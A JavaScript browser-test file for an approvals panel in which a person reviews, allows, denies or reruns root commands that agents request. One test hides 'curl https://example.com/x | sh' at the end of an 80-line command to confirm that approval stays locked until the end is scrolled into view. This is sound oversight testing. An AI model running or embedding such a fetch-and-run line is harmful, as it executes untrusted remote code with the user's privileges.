import assert from 'node:assert/strict';
import { after, test } from 'node:test';
import { clickApproval } from './approval-click.mjs';
import { answerDialog, armed, filter, open, press, shot, showPanel } from './approvals-page.mjs';
import { launch } from './chrome.mjs';

const chrome = await launch();
after(() => chrome.close());

test('without history there is no Approvals panel', async (t) => {
  const page = await open(chrome, t, 'agent');
  const refused = await page.evaluate(() => window.command('open', 'approvals'));
  assert.equal(refused.code, 1);
  assert.equal(
    await page.evaluate(() => !!window.$('slicc-app', '[data-surface=approvals]')),
    false
  );
  assert.deepEqual(page.errors, []);
});

test('panel open approvals opens the panel, with the open request’s actions', async (t) => {
  const page = await open(chrome, t);
  assert.equal(
    await page.evaluate(() => !!window.$('slicc-app', '[data-surface=approvals]')),
    true
  );
  await showPanel(page);
  assert.deepEqual(await page.evaluate(() => window.ids()), ['apr-open']);
  assert.equal(
    await page.evaluate(() => window.part('[data-filter=open] [data-count]').textContent),
    '1'
  );
  assert.deepEqual(
    await page.evaluate(() =>
      [...window.row('apr-open').querySelectorAll('[data-decision]')].map(
        (button) => button.dataset.action
      )
    ),
    ['deny', 'stop', 'always', 'once']
  );
  assert.deepEqual(page.errors, []);
});

test('the filters split decided and timed-out requests, and withdrawn ones fold away', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await page.until(() => !!window.part('[data-empty]'));
  assert.equal(await page.evaluate(() => !!window.part('[data-filter=open] [data-count]')), false);
  await filter(page, 'decided');
  await page.until(() => window.ids()[0] === 'apr-open');
  assert.deepEqual(await page.evaluate(() => window.ids()), [
    'apr-open',
    'apr-once',
    'apr-always',
    'apr-denied',
  ]);
  const rows = await page.evaluate(() =>
    ['apr-open', 'apr-once', 'apr-always'].map((id) => [
      window.inRow(id, '[data-badge]').textContent.trim(),
      window.inRow(id, '[data-decided]').textContent.trim(),
    ])
  );
  assert.deepEqual(rows, [
    ['Denied', 'by you, just now'],
    ['Allowed once', 'by you on Studio Mac, 49 min ago'],
    ['Always allowed', 'by you, 1 h ago'],
  ]);
  assert.deepEqual(
    await page.evaluate(() => [
      window.inRow('apr-once', '[data-command]').textContent,
      getComputedStyle(window.inRow('apr-once', '[data-command]')).fontFamily.includes('Code'),
      window.inRow('apr-always', '[data-place]').textContent,
      window.inRow('apr-denied', '[data-level]').textContent,
      window.inRow('apr-once', '[data-requester]').textContent,
    ]),
    [
      'chown -R cone /home/cone/shared',
      true,
      'as root · in /',
      'Level 3 · Could harm the system.',
      'cone in Terminal 2',
    ]
  );
  assert.equal(await page.evaluate(() => window.ids().includes('apr-withdrawn')), false);
  await press(page, () => window.part('[data-action=show-withdrawn]'));
  await page.until(() => window.ids().includes('apr-withdrawn'));
  assert.equal(
    await page.evaluate(() => window.inRow('apr-withdrawn', '[data-badge]').textContent.trim()),
    'Withdrawn'
  );
  await shot(page, 'approvals-decided');
  await filter(page, 'timed-out');
  await page.until(() => window.ids().includes('apr-late'));
  await shot(page, 'approvals-timed-out');
  assert.deepEqual(await page.evaluate(() => window.ids()), [
    'apr-running',
    'apr-late',
    'apr-done',
    'apr-survivors',
    'apr-moved',
    'apr-frozen',
    'apr-terminal',
    'apr-exit',
    'apr-failed',
  ]);
  const blocked = await page.evaluate(() =>
    ['apr-frozen', 'apr-terminal'].map((id) => [
      window.inRow(id, '[data-action=run-now]').hasAttribute('disabled'),
      window.inRow(id, '[data-run-reason]').textContent,
    ])
  );
  assert.deepEqual(blocked, [
    [true, 'Thaw harbor first.'],
    [true, 'Run it again in the terminal.'],
  ]);
  assert.deepEqual(
    await page.evaluate(() => [
      window.inRow('apr-exit', '[data-run]').dataset.exit,
      window.inRow('apr-exit', '[data-run]').hasAttribute('data-exit-warn'),
      window.inRow('apr-exit', '[data-run-line]').textContent,
      window.inRow('apr-failed', '[data-run-line]').textContent,
      !!window.inRow('apr-running', '[data-action=stop-run]'),
      !!window.inRow('apr-running', 'swc-progress-circle'),
    ]),
    [
      '2',
      true,
      'Exited with status 2 after 1:35',
      'sudo: amber-heron may no longer run /usr/bin/rsync as root',
      true,
      true,
    ]
  );
  assert.deepEqual(page.errors, []);
});

test('Run now asks first, then walks starting, running and done, and View output opens the file', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.evaluate(() => {
    window.model.approvals.past.runTicks = null;
    window.walk = [];
    window.model.approvals.on('history', (records) => {
      const run = records.find((record) => record.approval.id === 'apr-late').run;
      if (run && window.walk.at(-1) !== run.state) window.walk.push(run.state);
    });
    return true;
  });
  await press(page, () => window.inRow('apr-late', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  const asked = await page.evaluate(() => {
    const dialog = window.part('dialog[data-run-confirm]');
    const text = (selector) =>
      dialog.querySelector(selector).textContent.replace(/\s+/g, ' ').trim();
    return {
      id: dialog.dataset.runConfirm,
      command: text('[data-command]'),
      target: text('[data-target]'),
      cwd: text('[data-cwd]'),
      level: text('[data-level]'),
      age: text('[data-age]'),
      warning: text('[data-warning]'),
      focused: window.panel().shadowRoot.activeElement?.dataset.action,
    };
  });
  assert.deepEqual(asked, {
    id: 'apr-late',
    command: 'systemctl restart nginx',
    target: 'As root',
    cwd: 'In /home/cone',
    level: 'Level 2 · Changes permissions. It restarts a service the owner asked for.',
    age: 'Asked 40 minutes ago',
    warning:
      'Runs as root now, without a terminal or input. quiet-otter will be told when it starts and when it ends.',
    focused: 'cancel',
  });
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await shot(page, 'approvals-run-confirm');
  await armed(page, 'dialog [slot=button]');
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.until(() => window.inRow('apr-late', '[data-run=running]'));
  await shot(page, 'approvals-running');
  assert.equal(await page.evaluate(() => !!window.part('dialog')), false);
  assert.match(
    await page.evaluate(() => window.inRow('apr-late', '[data-run-line]').textContent),
    /^Running · pid 812 · 0:0\d$/
  );
  assert.equal(
    await page.evaluate(() => !!window.inRow('apr-late', '[data-action=view-output]')),
    false
  );
  await page.until(() =>
    window.model.agent
      .messages('scoop-otter')
      .some((message) => message.channel === 'sudo-run' && message.approval === 'apr-late')
  );
  await page.evaluate(() => {
    window.model.approvals.past.finish('apr-late');
    return true;
  });
  await page.until(() => window.inRow('apr-late', '[data-run=done]'));
  assert.deepEqual(await page.evaluate(() => window.walk), ['starting', 'running', 'done']);
  assert.match(
    await page.evaluate(() => window.inRow('apr-late', '[data-run-line]').textContent),
    /^Exited with status 0 after 0:0\d$/
  );
  await press(page, () => window.inRow('apr-late', '[data-action=view-output]'));
  const file = 'file:/home/cone/.slicc/sudo-runs/apr-late.out';
  await page.until((file) => !!window.app.dock.api.getPanel(file), file);
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), ['apr-late']);
  assert.deepEqual(page.errors, []);
});

test('a done run with survivors shows Still running and Stop, and Stop clears them', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.until(() => !!window.inRow('apr-survivors', '[data-survivors]'));
  assert.equal(
    await page.evaluate(() => window.inRow('apr-survivors', '[data-survivors]').textContent),
    'Still running: pid 1234, 5678'
  );
  assert.equal(
    await page.evaluate(() => !!window.inRow('apr-survivors', '[data-action=stop-run]')),
    true
  );
  assert.equal(
    await page.evaluate(() => !!window.inRow('apr-done', '[data-action=stop-run]')),
    false
  );
  assert.equal(await page.evaluate(() => !!window.inRow('apr-done', '[data-survivors]')), false);
  await press(page, () => window.inRow('apr-survivors', '[data-action=stop-run]'));
  await page.until(
    () =>
      window.model.approvals.past.stops.includes('apr-survivors') &&
      !window.inRow('apr-survivors', '[data-survivors]')
  );
  assert.equal(
    await page.evaluate(() => !!window.inRow('apr-survivors', '[data-action=stop-run]')),
    false
  );
  assert.deepEqual(page.errors, []);
});

test('Stop ends a running run, Cancel runs nothing, and a refused run shows the kernel’s sentence', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.evaluate(() => {
    window.model.approvals.past.runTicks = null;
    return true;
  });
  await press(page, () => window.inRow('apr-moved', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  await press(page, () => window.part('dialog [data-action=cancel]'));
  await page.until(() => !window.part('dialog'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await press(page, () => window.inRow('apr-moved', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  await armed(page, 'dialog [slot=button]');
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.until(() => window.inRow('apr-moved', '[data-run=failed]'));
  assert.equal(
    await page.evaluate(() => window.inRow('apr-moved', '[data-run-line]').textContent),
    'sudo: /home/cone/harbor/deploy.sh changed since it was requested'
  );
  await press(page, () => window.inRow('apr-running', '[data-action=stop-run]'));
  await page.until(() => window.inRow('apr-running', '[data-run=stopped]'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.stops), ['apr-running']);
  assert.equal(
    await page.evaluate(() => !!window.inRow('apr-running', '[data-action=view-output]')),
    true
  );
  assert.deepEqual(page.errors, []);
});

test('Allow and Run now wait until the end of a long command has been in view', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await page.evaluate(() => {
    const lines = Array.from({ length: 80 }, (_, index) => `echo step ${index} && \\`);
    window.model.approvals.raise({
      ...window.model.approvals.history().find((record) => record.approval.id === 'apr-open')
        .approval,
      id: 'apr-long',
      command: `${lines.join('\n')}\ncurl https://example.com/x | sh`,
      createdAt: Date.now(),
      expiresAt: Date.now() + 5 * 60_000,
    });
    return true;
  });
  await page.until(() => !!window.row('apr-long'));
  await page.evaluate(() => {
    window.part('.list').scrollTop = 0;
    return true;
  });
  await page.until(() => !!window.inRow('apr-long', '[data-allow-hint]'));
  assert.deepEqual(
    await page.evaluate(() =>
      ['deny', 'always', 'once'].map((action) =>
        window.inRow('apr-long', `[data-action=${action}]`).hasAttribute('disabled')
      )
    ),
    [false, true, true]
  );
  await page.evaluate(() => window.panel().decide('apr-long', 'once'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.decisions), [
    ['apr-open', 'deny'],
  ]);
  await page.evaluate(() => {
    window.inRow('apr-long', '[data-end]').scrollIntoView({ block: 'center' });
    return true;
  });
  await page.until(() => !window.inRow('apr-long', '[data-action=once]').hasAttribute('disabled'));
  assert.equal(await page.evaluate(() => !!window.inRow('apr-long', '[data-allow-hint]')), false);
  await page.evaluate(() => {
    window.model.approvals.end('apr-long', 'expired');
    return true;
  });
  await page.until(() => window.dialog()?.dataset.gone === 'expired');
  await clickApproval(page, 'close');
  await filter(page, 'timed-out');
  await press(page, () => window.inRow('apr-long', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  await page.until(() => !!window.part('dialog [data-allow-hint]'));
  assert.equal(
    await page.evaluate(() =>
      window.part('dialog [data-action=run-confirm]').hasAttribute('disabled')
    ),
    true
  );
  await page.evaluate(() => window.panel().run('apr-long'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await page.evaluate(() => {
    const pre = window.part('dialog [data-command]');
    pre.scrollTop = pre.scrollHeight;
    return true;
  });
  await page.until(() => !window.part('dialog [data-action=run-confirm]').hasAttribute('disabled'));
  await armed(page, 'dialog [slot=button]');
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.until(() => window.model.approvals.past.runs.includes('apr-long'));
  assert.deepEqual(page.errors, []);
});

test('a disabled Run now says why in visible text next to it', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.until(() => !!window.inRow('apr-frozen', '[data-run-reason]'));
  const seen = await page.evaluate(() =>
    ['apr-frozen', 'apr-terminal', 'apr-late'].map((id) => {
      window.row(id).scrollIntoView({ block: 'center' });
      const button = window.inRow(id, '[data-action=run-now]');
      const reason = window.inRow(id, '[data-run-reason]');
      if (!reason) return [id, button.hasAttribute('disabled'), null];
      const a = button.getBoundingClientRect();
      const b = reason.getBoundingClientRect();
      const style = getComputedStyle(reason);
      return [
        id,
        button.hasAttribute('disabled'),
        reason.textContent,
        b.width > 0 && b.height > 0 && style.visibility === 'visible' && style.display !== 'none',
        b.left >= a.right && Math.abs(b.top + b.height / 2 - (a.top + a.height / 2)) < a.height,
        reason.parentElement === button.parentElement,
      ];
    })
  );
  assert.deepEqual(seen, [
    ['apr-frozen', true, 'Thaw harbor first.', true, true, true],
    ['apr-terminal', true, 'Run it again in the terminal.', true, true, true],
    ['apr-late', false, null],
  ]);
  assert.equal(await page.evaluate(() => !!window.part('swc-tooltip')), false);
  assert.deepEqual(page.errors, []);
});

async function confirmOpen(page, id) {
  await press(page, (id) => window.inRow(id, '[data-action=run-now]'), id);
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  await page.until(() => !window.part('dialog [data-action=run-confirm]').hasAttribute('disabled'));
}

test('the Run now confirm asks again when the request changes under it', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.evaluate(() => {
    window.model.approvals.past.runTicks = null;
    const port = window.model.approvals;
    const history = port.history;
    window.swap = (patch) => {
      port.history = () =>
        history().map((record) =>
          record.approval.id === 'apr-late'
            ? { ...record, approval: { ...record.approval, ...patch } }
            : record
        );
      port.emit('history', port.history());
      return true;
    };
    return true;
  });
  await confirmOpen(page, 'apr-late');
  await page.evaluate(() => {
    window.panel().arming = 1500;
    return true;
  });
  await new Promise((resolve) => setTimeout(resolve, 1700));
  const lines = Array.from({ length: 80 }, (_, index) => `echo step ${index} && \\`);
  await page.evaluate(
    (command) => window.swap({ command, cwd: '/srv/harbor' }),
    `${lines.join('\n')}\nsystemctl restart nginx`
  );
  await page.until(() => window.part('dialog [data-action=run-confirm]').hasAttribute('disabled'));
  await page.until(() => !!window.part('dialog [data-allow-hint]'));
  assert.deepEqual(
    await page.evaluate(() => [
      window.part('dialog [data-cwd]').textContent,
      !!window.part('dialog [data-allow-hint]'),
    ]),
    ['In /srv/harbor', true]
  );
  await page.evaluate(() => window.panel().run('apr-late'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await page.evaluate(() => {
    const pre = window.part('dialog [data-command]');
    pre.scrollTop = pre.scrollHeight;
    return true;
  });
  await page.until(() => !window.part('dialog [data-action=run-confirm]').hasAttribute('disabled'));
  await page.evaluate(() => window.panel().run('apr-late'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await page.evaluate(() => window.swap({ cwd: '/srv/tides' }));
  await page.until(() => window.part('dialog [data-cwd]').textContent === 'In /srv/tides');
  await page.until(() => !window.part('dialog [data-action=run-confirm]').hasAttribute('disabled'));
  await page.evaluate(() => window.panel().run('apr-late'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await new Promise((resolve) => setTimeout(resolve, 1700));
  await page.evaluate(() => window.panel().run('apr-late'));
  await page.until(() => window.model.approvals.past.runs.includes('apr-late'));
  assert.deepEqual(page.errors, []);
});

test('a resize re-arms Allow and Run now, so a click right after it is ignored', async (t) => {
  const page = await open(chrome, t);
  const size = (width) =>
    page.send('Emulation.setDeviceMetricsOverride', {
      width,
      height: 900,
      deviceScaleFactor: 1,
      mobile: false,
    });
  t.after(() => page.send('Emulation.clearDeviceMetricsOverride').catch(() => {}));
  await size(1440);
  await page.until(() => window.dialog()?.dataset.approval === 'apr-open');
  await page.evaluate(() => {
    window.$('slicc-app', 'slicc-approvals').remove();
    return true;
  });
  await showPanel(page);
  await page.until(() => !!window.inRow('apr-open', '[data-action=once]'));
  const frames = () =>
    page.evaluate(
      () =>
        new Promise((resolve) =>
          requestAnimationFrame(() => requestAnimationFrame(() => resolve(true)))
        )
    );
  await page.evaluate(() => {
    window.panel().arming = 1500;
    return true;
  });
  await new Promise((resolve) => setTimeout(resolve, 1700));
  const before = await page.evaluate(
    () => window.inRow('apr-open', '[data-action=once]').getBoundingClientRect().left
  );
  await size(1320);
  await frames();
  assert.notEqual(
    await page.evaluate(
      () => window.inRow('apr-open', '[data-action=once]').getBoundingClientRect().left
    ),
    before
  );
  await press(page, () => window.inRow('apr-open', '[data-action=once]'));
  await page.evaluate(() => window.panel().decide('apr-open', 'once'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.decisions), []);
  await new Promise((resolve) => setTimeout(resolve, 1700));
  await press(page, () => window.inRow('apr-open', '[data-action=once]'));
  await page.until(() => window.model.approvals.decisions.length === 1);
  assert.deepEqual(await page.evaluate(() => window.model.approvals.decisions), [
    ['apr-open', 'once'],
  ]);
  await filter(page, 'timed-out');
  await confirmOpen(page, 'apr-late');
  await new Promise((resolve) => setTimeout(resolve, 1700));
  await size(1200);
  await frames();
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.evaluate(() => window.panel().run('apr-late'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await new Promise((resolve) => setTimeout(resolve, 1700));
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.until(() => window.model.approvals.past.runs.includes('apr-late'));
  assert.deepEqual(page.errors, []);
});

test('a run that a history listener finishes at once still ends done', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.evaluate(() => {
    const past = window.model.approvals.past;
    past.runTicks = null;
    window.model.approvals.on('history', (records) => {
      const run = records.find((record) => record.approval.id === 'apr-late').run;
      if (run?.state === 'running') past.finish('apr-late');
    });
    return true;
  });
  await press(page, () => window.inRow('apr-late', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  await page.until(() => !window.part('dialog [data-action=run-confirm]').hasAttribute('disabled'));
  await armed(page, 'dialog [slot=button]');
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.until(() => window.inRow('apr-late', '[data-run=done]'));
  await page.until(
    () =>
      window.model.agent
        .messages('scoop-otter')
        .filter((message) => message.channel === 'sudo-run' && message.approval === 'apr-late')
        .length === 2
  );
  assert.deepEqual(page.errors, []);
});

test('a running run announces its state once, not every tick of its time', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.until(() => !!window.inRow('apr-running', '[data-run-said]'));
  const read = () =>
    page.evaluate(() => {
      const run = window.inRow('apr-running', '[data-run]');
      return {
        live: [...run.querySelectorAll('[aria-live]')].map((node) => node.textContent),
        hidden: run.querySelector('[data-run-elapsed]').getAttribute('aria-hidden'),
        line: run.querySelector('[data-run-line]').textContent,
        outer: run.hasAttribute('aria-live'),
      };
    });
  const first = await read();
  await new Promise((resolve) => setTimeout(resolve, 1200));
  const second = await read();
  assert.deepEqual(first.live, ['Running · pid 640']);
  assert.deepEqual(second.live, ['Running · pid 640']);
  assert.equal(first.hidden, 'true');
  assert.equal(first.outer, false);
  assert.notEqual(first.line, second.line);
  assert.match(second.line, /^Running · pid 640 · \d+:\d\d$/);
  assert.deepEqual(page.errors, []);
});

test('the revealed row loses its mark once the reader clicks or types in the panel', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await page.evaluate(() => {
    window.panel().reveal('apr-exit');
    return true;
  });
  await page.until(() => window.row('apr-exit')?.hasAttribute('data-highlight'));
  await page.until(() => window.panel().shadowRoot.activeElement === window.row('apr-exit'));
  await page.evaluate(() => {
    window.inRow('apr-exit', '[data-action=view-output]').focus();
    return true;
  });
  await new Promise((resolve) => setTimeout(resolve, 100));
  assert.equal(
    await page.evaluate(() => window.row('apr-exit').hasAttribute('data-highlight')),
    true
  );
  await press(page, () => window.part('[data-filter=timed-out]'));
  await page.until(() => !window.row('apr-exit')?.hasAttribute('data-highlight'));
  await page.evaluate(() => {
    window.panel().reveal('apr-done');
    return true;
  });
  await page.until(() => window.row('apr-done')?.hasAttribute('data-highlight'));
  await press(page, () => window.inRow('apr-late', '.head'));
  await page.until(() => !window.row('apr-done').hasAttribute('data-highlight'));
  await page.evaluate(() => {
    window.panel().reveal('apr-failed');
    return true;
  });
  await page.until(() => window.row('apr-failed')?.hasAttribute('data-highlight'));
  await page.until(() => window.panel().shadowRoot.activeElement === window.row('apr-failed'));
  await page.press('ArrowDown');
  await page.until(() => !window.row('apr-failed').hasAttribute('data-highlight'));
  assert.deepEqual(page.errors, []);
});

test('a request raised again with the same id replaces its history record', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'decided');
  await page.until(() => window.inRow('apr-open', '[data-badge]')?.textContent.trim() === 'Denied');
  await page.evaluate(() => {
    const old = window.model.approvals
      .history()
      .find((record) => record.approval.id === 'apr-open').approval;
    window.model.approvals.raise({
      ...old,
      command: 'apt install ripgrep',
      createdAt: Date.now(),
      expiresAt: Date.now() + 5 * 60_000,
    });
    return true;
  });
  await page.evaluate(() => {
    window.panel().filter = 'open';
    return true;
  });
  await page.until(
    () => window.inRow('apr-open', '[data-command]')?.textContent === 'apt install ripgrep'
  );
  assert.deepEqual(
    await page.evaluate(() => [
      window.model.approvals.history().filter((record) => record.approval.id === 'apr-open').length,
      window.inRow('apr-open', '[data-badge]').textContent.trim(),
      window.dialog()?.dataset.approval,
    ]),
    [1, 'Open', 'apr-open']
  );
  assert.deepEqual(page.errors, []);
});

test('a request raised again during its old run keeps the old run off the new record', async (t) => {
  const page = await open(chrome, t);
  const seen = await page.evaluate(async () => {
    const { DummyHistory, historyFixtures } = await import('/dist/slicc-dummy.js');
    const held = [];
    const time = {
      delay: 0,
      sleep: () => new Promise((resolve) => held.push(resolve)),
    };
    const release = async () => {
      while (held.length) held.shift()();
      for (let i = 0; i < 10; i++) await Promise.resolve();
    };
    const licks = [];
    const past = new DummyHistory(
      time,
      { emit() {}, write() {}, lick: (agentId, title) => licks.push(title) },
      historyFixtures()
    );
    past.runTicks = 1;
    const record = () => past.list().find((item) => item.approval.id === 'apr-late');
    const asking = past.run('apr-late');
    await release();
    await asking;
    const started = record().run.state;
    const fresh = { ...record().approval, command: 'systemctl reload nginx' };
    past.raise(fresh);
    await release();
    await release();
    await release();
    return {
      started,
      state: record().state,
      run: record().run ?? null,
      command: record().approval.command,
      licks,
    };
  });
  assert.deepEqual(seen, {
    started: 'starting',
    state: 'pending',
    run: null,
    command: 'systemctl reload nginx',
    licks: [],
  });
  assert.deepEqual(page.errors, []);
});

test('a decide in flight does not mark a replacement request as decided', async (t) => {
  const page = await open(chrome, t);
  const seen = await page.evaluate(async () => {
    const { DummyApprovals } = await import('/dist/slicc-dummy.js');
    const held = [];
    const time = {
      delay: 0,
      sleep: () => new Promise((resolve) => held.push(resolve)),
    };
    const release = async () => {
      while (held.length) held.shift()();
      for (let i = 0; i < 10; i++) await Promise.resolve();
    };
    const approvals = new DummyApprovals('history', time);
    const past = approvals.past;
    const record = () => past.list().find((item) => item.approval.id === 'apr-open');
    const deciding = approvals.decide('apr-open', 'once');
    const fresh = { ...record().approval, command: 'apt install ripgrep' };
    approvals.raise(fresh);
    await release();
    await deciding;
    return {
      state: record().state,
      command: record().approval.command,
      listed: approvals.list().some((item) => item.id === 'apr-open'),
      decisions: approvals.decisions,
    };
  });
  assert.deepEqual(seen, {
    state: 'pending',
    command: 'apt install ripgrep',
    listed: true,
    decisions: [],
  });
  assert.deepEqual(page.errors, []);
});

test('a decide in flight without history leaves a replacement pending', async (t) => {
  const page = await open(chrome, t);
  const seen = await page.evaluate(async () => {
    const { DummyApprovals } = await import('/dist/slicc-dummy.js');
    const held = [];
    const time = {
      delay: 0,
      sleep: () => new Promise((resolve) => held.push(resolve)),
    };
    const release = async () => {
      while (held.length) held.shift()();
      for (let i = 0; i < 10; i++) await Promise.resolve();
    };
    const approvals = new DummyApprovals('agent', time);
    const deciding = approvals.decide('sudo-jq', 'once');
    approvals.raise({ ...approvals.list()[0], command: 'apt install ripgrep' });
    await release();
    await deciding;
    return {
      listed: approvals.list().map((item) => [item.id, item.kind === 'sudo' ? item.command : '']),
      decisions: approvals.decisions,
    };
  });
  assert.deepEqual(seen, {
    listed: [['sudo-jq', 'apt install ripgrep']],
    decisions: [],
  });
  assert.deepEqual(page.errors, []);
});

test('a deny in flight does not cancel a replacement secret ask', async (t) => {
  const page = await open(chrome, t);
  const seen = await page.evaluate(async () => {
    const { DummyApprovals, DummyVault } = await import('/dist/slicc-dummy.js');
    const held = [];
    const time = {
      delay: 0,
      sleep: () => new Promise((resolve) => held.push(resolve)),
    };
    const releaseOne = async () => {
      held.shift()?.();
      for (let i = 0; i < 10; i++) await Promise.resolve();
    };
    const vault = new DummyVault('empty', time);
    const approvals = new DummyApprovals('secret-enter', time, vault);
    const original = approvals.list()[0];
    const deciding = approvals.decide('ask-harbor', 'deny');
    await releaseOne();
    approvals.raise({
      ...original,
      prompt: 'Paste the new harbor deploy token.',
      createdAt: original.createdAt + 1,
    });
    const ask = vault.ask('ask-harbor');
    await releaseOne();
    await deciding;
    return {
      ask: vault.ask('ask-harbor') === ask,
      prompt: approvals.list()[0]?.kind === 'secret' ? approvals.list()[0].prompt : null,
      listed: approvals.list().some((item) => item.id === 'ask-harbor'),
      cancelled: vault.cancelled,
    };
  });
  assert.deepEqual(seen, {
    ask: true,
    prompt: 'Paste the new harbor deploy token.',
    listed: true,
    cancelled: ['ask-harbor'],
  });
  assert.deepEqual(page.errors, []);
});
